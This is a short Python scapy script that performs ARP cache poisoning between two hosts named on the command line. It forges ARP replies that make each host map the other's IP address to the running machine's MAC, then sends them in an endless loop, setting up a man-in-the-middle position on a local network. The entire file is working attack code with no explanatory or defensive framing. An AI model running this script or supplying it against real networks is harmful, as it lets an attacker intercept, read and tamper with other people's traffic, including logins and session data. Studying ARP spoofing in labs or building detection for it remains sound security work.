#!/usr/bin/env python
from scapy.all import *
import sys

ETH = "eth0"
mac = get_if_hwaddr(ETH)
to = sys.argv[1]
to_mac = getmacbyip(to)

target = sys.argv[2]
target_mac = getmacbyip(target)


pkt = Ether(src=mac, dst=to_mac) / ARP(hwsrc=mac, psrc=target, hwdst=to_mac, pdst=to, op=2)
pkt2 = Ether(src=mac, dst=target_mac) / ARP(hwsrc=mac, psrc=to, hwdst=target_mac, pdst=target, op=2)
while True:
    sendp(pkt, inter=2, iface=ETH)
    sendp(pkt2, inter=2, iface=ETH)
